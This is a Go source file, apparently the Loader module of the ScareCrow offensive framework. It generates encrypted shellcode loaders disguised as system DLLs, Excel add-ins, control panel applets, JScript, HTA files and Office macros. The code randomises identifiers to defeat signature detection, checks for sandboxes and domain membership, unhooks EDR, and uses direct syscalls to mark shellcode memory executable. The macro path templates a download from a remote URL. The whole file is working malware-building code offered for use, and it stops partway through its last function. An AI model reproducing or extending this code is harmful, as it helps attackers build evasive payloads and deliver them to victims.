package Loader

import (
	"ScareCrow/Cryptor"
	"ScareCrow/Struct"
	"ScareCrow/Utils"
	"bufio"
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"text/template"
)

type Binary struct {
	Variables map[string]string
}

type JScript struct {
	Variables map[string]string
}

type JScriptLoader struct {
	Variables map[string]string
}

type SandboxJScript struct {
	Variables map[string]string
}
type DLL struct {
	Variables map[string]string
}
type WindowsVersion struct {
	Variables map[string]string
}
type Sandboxfunction struct {
	Variables map[string]string
}
type Sandbox_DomainJoined struct {
	Variables map[string]string
}
type HTALoader struct {
	Variables map[string]string
}
type Macro struct {
	Variables map[string]string
}

var (
	buffer bytes.Buffer
)

func FileName(mode string) (string, string) {
	var filename string
	var name string
	dllname := []string{"apphelp", "bcryptprimitives", "cfgmgr32", "combase", "cryptsp", "dpapi", "sechost", "schannel", "urlmon", "win32u"}
	cplname := []string{"appwizard", "bthprop", "desktop", "netfirewall", "FlashPlayer", "hardwarewiz", "inetcontrol", "control", "irprop", "game", "inputs", "mimosys", "ncp", "power", "speech", "system", "Tablet", "telephone", "datetime", "winsec"}
	officename := []string{"Timesheet", "Reports", "Zoom", "Updates", "Calculator", "Calendar", "Memo", "Desk", "Appwiz"}
	Binaryname := []string{"Excel", "Word", "Outlook", "Powerpnt", "lync", "cmd", "OneDrive"}

	if mode == "excel" {
		name = officename[Cryptor.GenerateNumer(0, 9)]
		filename = name + ".xll"
	}
	if mode == "control" {
		name = cplname[Cryptor.GenerateNumer(0, 20)]
		filename = name + ".cpl"
	}
	if mode == "wscript" {
		name = dllname[Cryptor.GenerateNumer(0, 10)]
		filename = name + ".dll"
	}

	if mode == "dll" {
		name = dllname[Cryptor.GenerateNumer(0, 10)]
		filename = name + ".dll"
	}

	if mode == "binary" {
		name = Binaryname[Cryptor.GenerateNumer(0, 7)]
		filename = name + ".exe"
	}
	return name, filename
}

func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, refresher bool, name string, sandbox bool) string {
	var LoaderTemplate, DLLStructTemplate string
	DLL := &DLL{}
	DLL.Variables = make(map[string]string)
	Sandboxfunction := &Sandboxfunction{}
	Sandboxfunction.Variables = make(map[string]string)
	Sandbox_DomainJoined := &Sandbox_DomainJoined{}
	Sandbox_DomainJoined.Variables = make(map[string]string)
	WindowsVersion := &WindowsVersion{}
	WindowsVersion.Variables = make(map[string]string)

	DLL.Variables["ciphertext"] = b64ciphertext
	DLL.Variables["key"] = b64key
	DLL.Variables["iv"] = b64iv
	DLL.Variables["vkey"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["viv"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["block"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["decrypted"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["mode"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["vciphertext"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["rawdata"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["stuff"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["raw_bin"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["hexdata"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["PKCS5UnPadding"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["length"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["src"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["unpadding"] = Cryptor.VarNumberLength(4, 12)

	DLL.Variables["ptr"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["buff"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["virtualAlloc"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["alloc"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["phandle"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["baseA"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["zerob"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["alloctype"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["protect"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["regionsizep"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["regionsize"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["WQRH"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["xx"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["yy"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["Versionfunc"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["k"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["Version"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["MV"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["MinV"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["customsyscall"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["customsyscallVP"] = Cryptor.VarNumberLength(4, 12)

	DLL.Variables["syscallnumber"] = Cryptor.VarNumberLength(4, 12)

	DLL.Variables["loc"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["dll"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["error"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["x"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["file"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["loaddll"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["handle"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["dllBase"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["dllOffset"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["old"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["mem"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["oldptrperms"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["ptr"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["shellcode"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["oldshellcodeperms"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["loader"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["hexdata"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["VirtualProtect"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["procVirtualProtect"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["Reloading"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["bytes"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["getWin"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["showWin"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["hwnd"] = Cryptor.VarNumberLength(4, 12)

	DLL.Variables["oldfartcodeperms"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["regionsize"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["runfunc"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["handle"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["NewProtect"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["oldprotect"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["baseAddress"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["regionSize"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["processHandle"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["handlez"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["syscall"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["syscallnumber"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["NtProtectVirtualMemory"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["sysid"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["bytesdata"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["locdata"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["xdata"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["dllBasedata"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["dllOffsetdata"] = Cryptor.VarNumberLength(4, 12)
	DLL.Variables["memdata"] = Cryptor.VarNumberLength(4, 12)

	if sandbox == true {
		DLL.Variables["IsDomainJoined"] = Cryptor.VarNumberLength(4, 12)
		DLL.Variables["domain"] = Cryptor.VarNumberLength(4, 12)
		DLL.Variables["status"] = Cryptor.VarNumberLength(4, 12)
		SandboxFunctionTemplate, err := template.New("Sandboxfunction").Parse(Struct.Sandbox())
		if err != nil {
			log.Fatal(err)
		}
		if err := SandboxFunctionTemplate.Execute(&buffer, DLL); err != nil {
			log.Fatal(err)
		}
		DLL.Variables["Sandboxfunction"] = buffer.String()
		DLL.Variables["checker"] = Cryptor.VarNumberLength(4, 12)
		Sandbox_DomainJoinedTemplate, err := template.New("Sandbox_DomainJoined").Parse(Struct.Sandbox_DomainJoined())
		buffer.Reset()
		if err != nil {
			log.Fatal(err)
		}
		if err := Sandbox_DomainJoinedTemplate.Execute(&buffer, DLL); err != nil {
			log.Fatal(err)
		}
		DLL.Variables["Sandbox"] = buffer.String()
		buffer.Reset()
	} else {
		DLL.Variables["Sandbox"] = ""
		DLL.Variables["Sandboxfunction"] = ""
		DLL.Variables["SandboxImport"] = ""
	}

	WindowsVersion.Variables["Version"] = DLL.Variables["Version"]
	WindowsVersion.Variables["syscall"] = DLL.Variables["syscall"]
	WindowsVersion.Variables["customsyscall"] = DLL.Variables["customsyscall"]
	WindowsVersion.Variables["customsyscallVP"] = DLL.Variables["customsyscallVP"]

	buffer.Reset()
	if refresher == false {
		LoaderTemplate = Struct.WindowsVersion_DLL_Refresher()
		DLLStructTemplate = Struct.DLL_Refresher()
	} else {
		LoaderTemplate = Struct.WindowsVersion_DLL()
		DLLStructTemplate = Struct.DLL()
	}

	WindowsVersionTemplate, err := template.New("WindowsVersion").Parse(LoaderTemplate)
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err := WindowsVersionTemplate.Execute(&buffer, WindowsVersion); err != nil {
		log.Fatal(err)
	}

	DLL.Variables["SyscallNumberlist"] = buffer.String()

	if mode == "excel" {
		DLL.Variables["ExportName"] = Struct.JS_Office_Export()

	}
	if mode == "control" {
		DLL.Variables["ExportName"] = Struct.JS_Control_Export()

	}
	if mode == "wscript" || mode == "dll" {
		DLL.Variables["ExportName"] = Struct.WS_JS_Export()
	}

	buffer.Reset()

	DLLTemplate, err := template.New("DLL").Parse(DLLStructTemplate)
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err := DLLTemplate.Execute(&buffer, DLL); err != nil {
		log.Fatal(err)
	}
	return buffer.String()

}

func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, console bool, sandbox bool, name string) string {
	var Structure string
	var buffer bytes.Buffer
	Binary := &Binary{}
	Sandboxfunction := &Sandboxfunction{}
	Sandboxfunction.Variables = make(map[string]string)
	Sandbox_DomainJoined := &Sandbox_DomainJoined{}
	Sandbox_DomainJoined.Variables = make(map[string]string)
	Binary.Variables = make(map[string]string)
	WindowsVersion := &WindowsVersion{}
	WindowsVersion.Variables = make(map[string]string)

	Binary.Variables["ciphertext"] = b64ciphertext
	Binary.Variables["key"] = b64key
	Binary.Variables["iv"] = b64iv
	Binary.Variables["vkey"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["viv"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["block"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["decrypted"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["mode"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["vciphertext"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["rawdata"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["stuff"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["raw_bin"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["hexdata"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["PKCS5UnPadding"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["length"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["src"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["unpadding"] = Cryptor.VarNumberLength(4, 12)

	Binary.Variables["loc"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["dll"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["error"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["x"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["file"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["loaddll"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["handle"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["dllBase"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["dllOffset"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["old"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["mem"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["oldptrperms"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["ptr"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["shellcode"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["oldshellcodeperms"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["loader"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["hexdata"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["VirtualProtect"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["procVirtualProtect"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["Reloading"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["bytes"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["Console"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["getWin"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["showWin"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["hwnd"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["show"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["SW_RESTORE"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["SW_HIDE"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["Version"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["syscall"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["Versionfunc"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["k"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["Version"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["MV"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["MinV"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["syscallnumber"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["NtProtectVirtualMemory"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["bytesdata"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["locdata"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["xdata"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["dllBasedata"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["dllOffsetdata"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["memdata"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["customsyscall"] = Cryptor.VarNumberLength(4, 12)

	Binary.Variables["PROCESS_ALL_ACCESS"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["errnoERROR_IO_PENDING"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["errERROR_IO_PENDING"] = Cryptor.VarNumberLength(4, 12)

	Binary.Variables["handle"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["regionsize"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["runfunc"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["oldptrperms"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["oldfartcodeperms"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["processHandle"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["NewProtect"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["sysid"] = Cryptor.VarNumberLength(4, 12)

	Binary.Variables["oldptrperms"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["baseAddress"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["regionSize"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["oldprotect"] = Cryptor.VarNumberLength(4, 12)
	Binary.Variables["handlez"] = Cryptor.VarNumberLength(4, 12)

	WindowsVersion.Variables["Version"] = Binary.Variables["Version"]
	WindowsVersion.Variables["syscall"] = Binary.Variables["syscall"]

	WindowsVersion.Variables["customsyscall"] = Binary.Variables["customsyscall"]

	buffer.Reset()
	WindowsVersionTemplate, err := template.New("WindowsVersion").Parse(Struct.WindowsVersion_Binary())
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err := WindowsVersionTemplate.Execute(&buffer, WindowsVersion); err != nil {
		log.Fatal(err)
	}
	Binary.Variables["SyscallNumberlist"] = buffer.String()
	buffer.Reset()

	if strconv.FormatBool(console) == "true" {
		Binary.Variables["hide"] = Binary.Variables["Console"] + "(true)"
		Binary.Variables["DebugImport"] = "\"io\""
		Binary.Variables["Debug"] = `
		var (
			debugWriter io.Writer
		)
		
		func printDebug(format string, v ...interface{}) {
			debugWriter = os.Stdout
			output := fmt.Sprintf("[DEBUG] ")
			output += format +"\n"
			fmt.Fprintf(debugWriter, output, v...)
		}
	`
		Binary.Variables["RefreshPE"] = "printDebug(\"RefreshPE failed:\", err)"
		Binary.Variables["EDR"] = "printDebug(\"[+] EDR removed\")"
		Binary.Variables["ShellcodeString"] = "printDebug(\"[*] Loading shellcode into a string\")"
		Binary.Variables["Pointer"] = "printDebug(\"[*] Create a Pointer on stack\")"
		Binary.Variables["CopyPointer"] = "printDebug(\"[*] Copy Pointer's attributes\")"
		Binary.Variables["OverwrittenShellcode"] = "printDebug(\"[*] Overwriten Pointer to point to shellcode String\")"
		Binary.Variables["OverWrittenPoint"] = "printDebug(\"[*] Overwriting shellcode String with Pointer's attributes\")"
		Binary.Variables["ReloadingMessage"] = "printDebug(\"[+] Reloading: \"+name +\" \")"
		Binary.Variables["VersionMessage"] = "printDebug(\"[+] Detected Version: \" +" + WindowsVersion.Variables["Version"] + ")"

	} else {
		Binary.Variables["hide"] = Binary.Variables["Console"] + "(false)"
		Binary.Variables["DebugImport"] = ""
		Binary.Variables["Debug"] = ""
		Binary.Variables["RefreshPE"] = ""
		Binary.Variables["EDR"] = ""
		Binary.Variables["ShellcodeString"] = ""
		Binary.Variables["Pointer"] = ""
		Binary.Variables["CopyPointer"] = ""
		Binary.Variables["OverwrittenShellcode"] = ""
		Binary.Variables["OverWrittenPoint"] = ""
		Binary.Variables["ReloadingMessage"] = ""
		Binary.Variables["VersionMessage"] = ""
	}

	if sandbox == true {
		Binary.Variables["IsDomainJoined"] = Cryptor.VarNumberLength(4, 12)
		Binary.Variables["domain"] = Cryptor.VarNumberLength(4, 12)
		Binary.Variables["status"] = Cryptor.VarNumberLength(4, 12)
		SandboxFunctionTemplate, err := template.New("Sandboxfunction").Parse(Struct.Sandbox())
		if err != nil {
			log.Fatal(err)
		}
		if err := SandboxFunctionTemplate.Execute(&buffer, Binary); err != nil {
			log.Fatal(err)
		}
		Binary.Variables["Sandboxfunction"] = buffer.String()
		Binary.Variables["checker"] = Cryptor.VarNumberLength(4, 12)
		Sandbox_DomainJoinedTemplate, err := template.New("Sandbox_DomainJoined").Parse(Struct.Sandbox_DomainJoined())
		buffer.Reset()
		if err != nil {
			log.Fatal(err)
		}
		if err := Sandbox_DomainJoinedTemplate.Execute(&buffer, Binary); err != nil {
			log.Fatal(err)
		}
		Binary.Variables["Sandbox"] = buffer.String()
		buffer.Reset()
	} else {
		Binary.Variables["Sandbox"] = ""
		Binary.Variables["Sandboxfunction"] = ""
		Binary.Variables["SandboxImport"] = ""
	}

	Structure = Struct.Binary()

	BinaryTemplate, err := template.New("Binary").Parse(Structure)
	if err != nil {
		log.Fatal(err)
	}
	if err := BinaryTemplate.Execute(&buffer, Binary); err != nil {
		log.Fatal(err)
	}
	return buffer.String()
}

func JScriptLoader_Buff(name string, filename string, mode string, sandbox bool) (string, string, string) {
	var LoaderTemplate string
	var buffer bytes.Buffer
	JScriptLoader := &JScriptLoader{}
	JScriptLoader.Variables = make(map[string]string)
	JScriptLoader.Variables["fso"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["dropPath"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["value"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["strRegPath"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["WshShell"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["objShell"] = Cryptor.VarNumberLength(4, 12)
	if mode == "excel" {
		JScriptLoader.Variables["ApplicationName"] = "excel.exe"
		JScriptLoader.Variables["RegName"] = "Excel"
		JScriptLoader.Variables["dllext"] = ".xll"
		JScriptLoader.Variables["objapp"] = Cryptor.VarNumberLength(4, 12)
		JScriptLoader.Variables["Application_Version"] = Cryptor.VarNumberLength(4, 12)
		JScriptLoader.Variables["FileName"] = name
		JScriptLoader.Variables["filename"] = filename
		LoaderTemplate = Struct.JS_Office_Sub()
	}
	if mode == "control" {
		LoaderTemplate = Struct.JS_Control_Sub()
		JScriptLoader.Variables["dllext"] = ".cpl"
		JScriptLoader.Variables["filename"] = filename
		JScriptLoader.Variables["FileName"] = name
	}
	if mode == "wscript" {
		JScriptLoader.Variables["dllext"] = ".dll"
		JScriptLoader.Variables["FileName"] = name
		JScriptLoader.Variables["DLLName"] = name
		JScriptLoader.Variables["manifest"] = Cryptor.VarNumberLength(4, 12)
		JScriptLoader.Variables["ax"] = Cryptor.VarNumberLength(4, 12)
		JScriptLoader.Variables["Execute"] = Cryptor.VarNumberLength(4, 12)
		JScriptLoader.Variables["progid"] = Cryptor.VarNumberLength(4, 12)
		JScriptLoader.Variables["filename"] = name
		LoaderTemplate = Struct.WS_JS()
	}
	buffer.Reset()
	JSLoaderTemplate, err := template.New("JScriptLoader").Parse(LoaderTemplate)
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err = JSLoaderTemplate.Execute(&buffer, JScriptLoader); err != nil {
		log.Fatal(err)
	}

	return buffer.String(), JScriptLoader.Variables["fso"], JScriptLoader.Variables["dropPath"]

}

func JScript_Buff(fso string, dropPath string, encoded string, code string, name string, mode string, sandbox bool) string {
	var buffer bytes.Buffer
	JScript := &JScript{}
	SandboxJScript := &SandboxJScript{}
	JScript.Variables = make(map[string]string)
	SandboxJScript.Variables = make(map[string]string)

	rawstring := []rune(encoded)
	splitval := len(rawstring)
	splitval = splitval - 45
	encodedfirsthalf := string(rawstring[:splitval])
	encodedsecondhalf := string(rawstring[splitval:])

	JScript.Variables["DLLName"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["fso"] = fso
	JScript.Variables["dropPath"] = dropPath
	JScript.Variables["Base64"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["dll"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["base6411"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["rtest"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["atest"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["ctest"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["ttest"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["etest"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["htest"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["atest"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["TextStream11"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["res1"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["filename1"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["characters"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["base6411decoded"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["BinaryStream"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["binaryWriter"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["dllname"] = ""
	JScript.Variables["dll_string1name"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["dll_string2name"] = Cryptor.VarNumberLength(4, 12)
	JScript.Variables["dll_string1"] = encodedfirsthalf
	JScript.Variables["dll_string2"] = encodedsecondhalf
	JScript.Variables["dll_code"] = encoded
	JScript.Variables["Loader"] = code
	if mode == "excel" {
		JScript.Variables["dllext"] = ".xll"
		JScript.Variables["FileName"] = name
	}
	if mode == "control" {
		JScript.Variables["dllext"] = ".cpl"
		JScript.Variables["FileName"] = name
	}
	if mode == "zip" {
	}
	if mode == "wscript" {
		JScript.Variables["dllext"] = ".dll"
		JScript.Variables["FileName"] = name
	}
	buffer.Reset()
	JSTemplate, err := template.New("JScript").Parse(Struct.JSfile())
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err = JSTemplate.Execute(&buffer, JScript); err != nil {
		log.Fatal(err)
	}

	if sandbox == true {
		SandboxJScript.Variables["objShell"] = Cryptor.VarNumberLength(4, 12)
		SandboxJScript.Variables["domain"] = Cryptor.VarNumberLength(4, 12)
		SandboxJScript.Variables["loader"] = buffer.String()
		buffer.Reset()
		SandboxJSTemplate, err := template.New("SandboxJScript").Parse(Struct.WScript_Sandbox())
		if err != nil {
			log.Fatal(err)
		}
		if err = SandboxJSTemplate.Execute(&buffer, SandboxJScript); err != nil {
			log.Fatal(err)
		}
	} else {

	}
	return buffer.String()
}

func HTA_Buff(finalcode string) string {
	var buffer bytes.Buffer
	HTALoader := &HTALoader{}
	HTALoader.Variables = make(map[string]string)
	HTALoader.Variables["payload"] = finalcode
	buffer.Reset()
	HTATemplate, err := template.New("HTALoader").Parse(Struct.HTA())
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err = HTATemplate.Execute(&buffer, HTALoader); err != nil {
		log.Fatal(err)
	}
	return buffer.String()
}

func Macro_Buff(URL string, outFile string) {
	var buffer bytes.Buffer
	macro := &Macro{}
	macro.Variables = make(map[string]string)
	macro.Variables["HTTPReq"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["t"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["remoteFile"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["pathOfFile"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["obj"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["Full"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["output"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["storeIn"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["sleep"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["outFile"] = outFile
	macro.Variables["URL"] = URL

	buffer.Reset()
	macroTemplate, err := template.New("macro").Parse(Struct.Macro())
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err := macroTemplate.Execute(&buffer, macro); err != nil {
		log.Fatal(err)
	}
	fmt.Println(buffer.String())
}

func CompileFile(b64ciphertext string, b64key string, b64iv string, mode string, outFile string, refresher bool, console bool, sandbox bool) (string, string) {
	var code string
	name, filename := FileName(mode)
	if mode == "excel" || mode == "wscript" || mode == "control" || mode == "dll" {
		code = DLLfile(b64ciphertext, b64key, b64iv, mode, refresher, name, sandbox)
	} else {
		code = Binaryfile(b64ciphertext, b64key, b64iv, mode, console, sandbox, name)
	}
	os.MkdirAll(name, os.ModePerm)
	Utils.Writefile(name+"/"+name+".go", code)
	Utils.B64decode("loader.zip")
	Utils.Unzip("loader.zip", name)
	os.RemoveAll("loader.zip")
	os.Chdir(name)
	return name, filename
}
func CompileLoader(mode string, outFile string, filename string, name string, CommandLoader string, URL string, sandbox bool) {
	if mode == "excel" {
		os.Rename(name+".dll", name+".xll")
	} else if mode == "control" {
		os.Rename(name+".dll", name+".cpl")
		if outFile == "" {
			os.Chdir("..")
			os.Rename(name+"/"+name+".cpl", name+".cpl")
			os.RemoveAll(name)
			fmt.Println("[+] " + name + ".cpl File Ready")
			if CommandLoader == "control" {
				outFile = name + ".cpl"
				Utils.Command(URL, CommandLoader, outFile)
			}
			return
		}
	} else if mode == "wscript" {
		os.Rename(outFile+".dll", name+".dll")
	} else if mode == "binary" {
		os.Chdir("..")
		os.Rename(name+"/"+name+".exe", name+".exe")
		os.RemoveAll(name)
		fmt.Println("[+] Binary Compiled")
		if CommandLoader == "bits" {
			outFile = name + ".exe"
			Utils.Command(URL, CommandLoader, outFile)
		}
		return
	} else if mode == "dll" {
		os.Chdir("..")
		os.Rename(name+"/"+name+".dll", name+".dll")
		os.RemoveAll(name)
		fmt.Println("[+] DLL Compiled")
		fmt.Println("[!] Note: Loading a dll (with Rundll32 or Regsvr32) that has the same name as a valid system DLL will cause problems, in this case its best to change the name slightly")
		return
	}
	fmt.Println("[*] Creating Loader")
	code, fso, dropPath := JScriptLoader_Buff(name, filename, mode, sandbox)
	f, _ := os.Open(filename)
	reader := bufio.NewReader(f)
	content, _ := ioutil.ReadAll(reader)
	encoded := base64.StdEncoding.EncodeToString(content)
	finalcode := JScript_Buff(fso, dropPath, encoded, code, name, mode, sandbox)
	URL = Utils.Command(URL, CommandLoader, outFile)
	if CommandLoader == "hta" {
		finalcode = HTA_Buff(finalcode)
	}
	if CommandLoader == "macro" {
		Macro_Buff(URL, outFile)
	}
	Utils.Writefile(outFile, finalcode)
	os.Chdir("..")
